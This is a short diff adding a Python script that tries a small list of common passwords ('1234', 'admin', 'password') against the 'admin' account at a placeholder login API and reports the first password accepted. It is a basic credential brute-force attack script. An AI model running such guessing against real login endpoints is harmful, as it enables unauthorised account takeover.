@@ -1,0 +1,14 @@
+import requests
+
+url = "https://api.example.com/login"
+
+passwords = ["1234", "admin", "password"]
+
+for password in passwords:
+    data = {"username": "admin", "password": password}
+
+    response = requests.post(url, json=data)
+
+    if response.status_code == 200:
+        print(f"[+] Password Found: {password}")
+        break
